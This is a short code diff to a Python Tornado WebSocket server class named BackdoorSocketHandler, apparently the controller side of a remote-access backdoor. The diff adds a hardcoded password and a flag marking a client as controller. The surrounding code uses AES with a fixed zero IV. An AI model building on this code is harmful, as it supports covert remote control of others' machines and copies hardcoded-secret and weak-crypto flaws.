@@ -11,6 +11,7 @@ __author__ = 'nekocode'
 
 class BackdoorSocketHandler(tornado.websocket.WebSocketHandler):
     clients = set()
+    PASSWORD = '110110'
 
     def data_received(self, chunk):
         pass
@@ -25,6 +26,7 @@ class BackdoorSocketHandler(tornado.websocket.WebSocketHandler):
         self.ID = None
         self.IV = '\0' * AES.block_size
         self.SECRET = None
+        self.is_controller = False
 
     def encrypt(self, text):
         encryptor = AES.new(self.SECRET, AES.MODE_CFB, self.IV)
@@ -48,6 +50,8 @@ class BackdoorSocketHandler(tornado.websocket.WebSocketHandler):
         if 'id' in msg:
             self.ID = msg['id']
             self.SECRET = b64decode(msg['secret'])
+            if 'pwd' in msg and BackdoorSocketHandler.PASSWORD == self.encrypt(msg['pwd']):
+                self.is_controller = True
             BackdoorSocketHandler.clients.add(self)
             print 'find new client: ' + self.request.remote_ip + '(' + self.ID + ')'
 
